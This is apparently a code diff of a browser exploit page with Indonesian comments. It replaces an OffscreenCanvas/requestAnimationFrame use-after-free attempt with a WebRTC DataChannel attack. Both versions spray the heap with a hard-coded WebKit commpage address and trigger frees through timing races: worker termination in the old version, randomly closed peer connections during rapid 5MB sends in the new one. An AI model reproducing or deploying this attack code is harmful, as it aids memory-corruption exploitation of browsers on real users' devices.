@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OffscreenCanvas/rAF State Confusion Attack</title>
+    <title>WebRTC DataChannel Corruption Attack</title>
 </head>
 <body>
 
-    <h1>OffscreenCanvas/rAF State Confusion (Commpage Target)</h1>
-    <canvas id="mainCanvas"></canvas>
+    <h1>WebRTC DataChannel Corruption (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan OffscreenCanvas dan rAF...</p>
+    <p id="status">INIT: Mempersiapkan Peer Connection...</p>
     <div id="log"></div>
 
     <script>
@@ -20,9 +19,11 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let worker = null;
-        let mainCanvas = null;
-        let payloadHolders = []; 
+        let peerA = null;
+        let peerB = null;
+        let dataChannelA = null;
+        let sprayHolders = []; 
+        let attackInterval = null;
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
@@ -37,77 +38,91 @@
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2025.12 + i; 
-                payloadHolders.push(payloadArray); 
+                payloadArray[2] = 2026.0 + i; 
+                sprayHolders.push(payloadArray); 
             }
-            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
         }
-
-        // --- FUNGSI EKSEKUSI UTAMA rAF ---
-        function rAFCallback() {
-            // Callback ini berjalan tepat sebelum frame dirender.
-            // Kita gunakan ini untuk meyakinkan WebKit bahwa Canvas masih hidup, 
-            // padahal kita akan mencoba menghancurkannya.
-            
-            // 1. Memicu JIT/Heap Grooming di Timing Paling Kritis
-            sprayPayload(); 
-            
-            // 2. Memicu Dereference pada Objek yang Dicurigai Corrupt
-            if (mainCanvas) {
-                try {
-                    // Memicu operasi grafis yang kompleks
-                    let ctx = mainCanvas.getContext('2d');
-                    ctx.fillStyle = `rgb(${LOW_WORD & 0xFF}, ${HIGH_WORD & 0xFF}, 0)`; 
-                    ctx.fillRect(0, 0, 10, 10);
-                    
-                    // Trigger final: Akses properti objek yang mungkin ditimpa
-                    let data = ctx.getImageData(0, 0, 1, 1).data;
-                    let crashValue = data[0] + data[1]; 
-
-                } catch(e) {
-                    log("JS Error/Crash Trigger: " + e.message);
-                }
-            }
-            // Lanjutkan rAF sampai crash terjadi
-            window.requestAnimationFrame(rAFCallback); 
-        }
-
 
         // --- FUNGSI UTAMA ATTACK ---
-        function runCanvasAttack() {
-            mainCanvas = document.getElementById('mainCanvas');
-            const offscreen = mainCanvas.transferControlToOffscreen();
-
-            log("Phase 1: Transfer Control ke OffscreenWorker.");
-            worker = new Worker('worker_canvas.js');
-
-            // Kirim OffscreenCanvas ke Worker untuk dimanipulasi
-            worker.postMessage({ cmd: 'start', canvas: offscreen }, [offscreen]);
-
-            // 2. Memicu rAF (Timer Kritis)
-            window.requestAnimationFrame(rAFCallback);
-            log("Phase 2: rAF Callback Aktif.");
-
-            // 3. Memicu Corrupt State (Mempercepat Worker Terminate)
-            // Kita coba terminasi Worker saat ia sedang memproses Canvas
-            setTimeout(() => {
-                log("Phase 3: TERMINATE Worker (Memaksa UAF di GPU Thread!).");
-                worker.terminate();
-                
-                // Hapus referensi untuk membantu GC (diperlukan)
-                worker = null; 
-            }, 100); 
+        async function runWebRTCAttack() {
+            log("Phase 1: Membuat Peer A dan Peer B.");
             
+            // Konfigurasi WebRTC
+            const config = { iceServers: [] }; 
+            peerA = new RTCPeerConnection(config);
+            peerB = new RTCPeerConnection(config);
+
+            // 2. DataChannel Setup (Korban)
+            dataChannelA = peerA.createDataChannel("exploit_channel");
+            
+            peerB.ondatachannel = function(event) {
+                const dataChannelB = event.channel;
+                dataChannelB.onmessage = function(e) {
+                    // Ketika B menerima pesan, B segera melakukan spray (UAF Race)
+                    if (e.data instanceof ArrayBuffer) {
+                        sprayPayload(); // Spray di thread penerima
+                        log("Spray dipicu oleh penerimaan data.");
+                    }
+                };
+            };
+            
+            // 3. ICE Exchange (Wajib untuk Koneksi)
+            peerA.onicecandidate = e => peerB.addIceCandidate(e.candidate).catch(() => {});
+            peerB.onicecandidate = e => peerA.addIceCandidate(e.candidate).catch(() => {});
+
+            // 4. Offer/Answer
+            const offer = await peerA.createOffer();
+            await peerA.setLocalDescription(offer);
+            await peerB.setRemoteDescription(peerA.localDescription);
+            const answer = await peerB.createAnswer();
+            await peerB.setLocalDescription(answer);
+            await peerA.setRemoteDescription(peerB.localDescription);
+            
+            log("Phase 2: Koneksi Peer dibuat. Menunggu DataChannel terbuka...");
+
+            // 5. Memicu Serialization Corruption/UAF
+            dataChannelA.onopen = function() {
+                log("Phase 3: DataChannel terbuka. Memulai serangan...");
+                
+                // Objek Biner Korban (Harus besar, DataChannel memecahnya)
+                const largeBuffer = new ArrayBuffer(5 * 1024 * 1024); // 5MB buffer
+                const victimView = new Uint32Array(largeBuffer);
+                victimView.fill(LOW_WORD); // Isi dengan nilai Commpage Target (LOW_WORD)
+                
+                // Interval serangan yang sangat cepat
+                attackInterval = setInterval(() => {
+                    if (dataChannelA.readyState === 'open') {
+                        dataChannelA.send(largeBuffer); // Kirim buffer besar berulang kali
+                        
+                        // Setelah mengirim, kita segera memutus koneksi secara acak (FREE/UAF)
+                        if (Math.random() < 0.1) { // 10% kemungkinan putus
+                            log("Trigger: Memutus Koneksi Secara Agresif.");
+                            peerA.close();
+                            peerB.close();
+                            clearInterval(attackInterval);
+                            
+                            // Trigger final dereference pada buffer yang mungkin sudah di-free/corrupt
+                            try {
+                                const finalCheck = victimView[0];
+                                let crashObj = {};
+                                crashObj[finalCheck] = 1; 
+                            } catch(e) {
+                                log("JS Error/Crash Trigger: " + e.message);
+                            }
+                        }
+                    }
+                }, 10); // Sangat cepat (10ms)
+            };
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-             if (!window.OffscreenCanvas) {
-                 document.getElementById('status').textContent = 'Gagal: OffscreenCanvas tidak didukung.';
+             if (!window.RTCPeerConnection) {
+                 document.getElementById('status').textContent = 'Gagal: WebRTC tidak didukung.';
                  return;
              }
-             document.getElementById('status').textContent = 'Memulai rangkaian OffscreenCanvas Attack...';
-             setTimeout(runCanvasAttack, 50);
-             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF/Confusion di GPU Process.';
+             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Attack...';
+             setTimeout(runWebRTCAttack, 50);
+             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Heap Corruption di WebRTC Process.';
         });
 
     </script>
